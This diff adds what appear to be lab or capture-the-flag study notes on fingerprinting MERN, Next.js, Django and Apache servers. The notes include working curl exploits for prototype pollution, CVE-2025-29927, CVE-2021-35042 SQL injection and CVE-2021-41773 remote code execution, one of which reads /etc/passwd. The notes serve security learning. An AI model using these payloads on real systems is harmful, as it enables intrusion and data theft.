@@ -1,0 +1,105 @@
+TARGET_IP = 10.114.166.15
+
+MERN stack
+ - MongoDB, Express.js, React, Node.js
+ - this stack is used by a lot of modern web applications (SaaS products, internals, API backends)
+ - Express.js is the most deployed Node.js framework
+ - in Express.js, it's very minimal, so devs write their own utility code
+ - that is exactly where vulnerabilities come from
+
+How to identify the MERN stack?
+ - Express is usually on ports 3000 or 5000 (with MongoDB on 27017)
+ - we check headers for Express.js (X-Powered-By: Express or Set-Cookie: connect.sid=...)
+ - curl -I <TARGET_IP:3000/> or curl -I <TARGET_IP:5000/>
+ - we can also check what response it gives for a non-existent path (should give a plaintext Cannot GET /nonexistent reply)
+ - curl <http://TARGET_IP:PORT>/nonexistent (or https) with the port same as the header one
+
+Exploiting MERN
+ - 7.4 High CVSS
+ - first save your session cookie to cookies.txt
+ - example:
+ - here we try prototype pollution payload to set isAdmin to true
+ - curl -b cookies.txt -X POST http://TARGET_IP:PORT/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'
+ - if succesful, we will get {"status":"updated"} or something similar
+ - now we try to do something on the admin panel, for example:
+ - curl -b cookies.txt http://TARGET_IP:PORT/api/admin/flag
+
+Next.js
+ - is a widespread React framework for production applications
+ - we have it on port 3001, so let's check headers
+ - curl -I http://10.114.166.15:3001/
+ - high-percentage signals that it's Next.js:
+    - X-Powered-By: Next.js header (clear giveaway)
+    - window.__next_f in script tag
+    - Middleware headers (X-Middleware-Next, X-Middleware-Rewrite)
+
+CVE-2025-29927: Middleware Bypass
+ - 9.1 Critical CVSS
+ - middleware in next.js is a function that runs before the request is processed
+ - it is used for authentication checks, session validation, redirect logic, ...
+ - eg. dashboard where middleware checks for a valid session cookie
+    - curl -v http://10.114.166.15:3001/dashboard
+    - without the cookie, we got redirected to /login
+ - we bypass it using a special header value
+    - the header value encodes the middleware module path, repeated five times.
+    - curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://10.114.166.15:3001/dashboard
+
+Django
+ - Django is a Python framework for web applications
+ - used by trusted (government, etc.) agencies, newsrooms, SaaS, ...
+ - handles backend infrastructure like database interactions and server logic
+ - provides a lot of out-of-the-box features
+ - typically on port 8000
+ - imagine how bad it would be if Django had vulnerabilities... ...
+
+CVE-2021-35042: Django Vulnerability
+ - SQL injection vulnerability in Django's order_by() query method
+ - 9.8 Critical CVSS score
+ - no authentication required to exploit
+ - note: the following exploit works only because DEBUG=True in settings.py
+         if it was set to False, we would do blind time-based SQL injection via SLEEP()
+ - eg. the afformentioned dashboard page has an order parameter
+    - updatexml() exploits the way MySQL XPath errors
+    - basically we surface the error message with updatexml()
+      the error msg includes the query result of the select (because of concat)
+    - the other stuff is to make the output more readable and the query valid
+    - curl -s "http://10.114.166.15:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
+
+LAMP
+ - Linux, Apache, MySQL, PHP
+ - LAMP is a classic web stack, still widely used
+ - there is a lot that can go wrong (exposed PHP files, db errors, weak file permissions)
+ - header cheeeeck
+ - curl -I http://10.114.166.15:8080/
+    - if you see Server: Apache/2.4.49 (Unix), look no further.
+    - this exact version maps to CVE-2021-41773
+    - cool trick:
+        - Apache loves to tell you it's version (he a good boy)
+        - eg. error page footers
+        - curl -v http://10.114.166.15:8080/nonexistent 2>&1
+
+CVE-2021-41773: Apache 2.4.49 Vulnerability
+ - 	9.8 Critical CVSS
+ - new version of Apache calls for new vulnerabilities...
+ - 2.4.49 introduced ap_normalize_path()
+ - breaking the path traversal filter
+ - the traversal filter runs before full URL decoding (wrong order)
+ - ok ... so we can read files ... whatever
+ - it's the interaction with mod_cgi that makes it fun
+ - /cgi-bin/ has CGI execution enabled
+ - when traversal resolves to some executable binary (eg. /bin/sh/)
+   Apache runs it as a CGI script
+ - you need --path-as-is flag (otherwise curl cleans up the .%2e/ sequence before sending)
+ - example:
+    - the actual command is at the very end: curl -s --path-as-is "http://10.114.166.15:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; <HERE_PUT_THE_COMMAND>'
+    - we try id to confirm RCE
+    - curl -s --path-as-is "http://10.114.166.15:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; id'
+    - we can read any file that the user, Apache is running as, can read
+    - we can read /etc/passwd for example:
+    - curl -s --path-as-is "http://10.114.166.15:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
+    - oopsies
+
+nikto
+ - nikto looks for known misconfigurations
+ - nikto -h <TARGET_IP:PORT>
+ - eg. nikto -h http://10.114.166.15:3000 (for MERN)
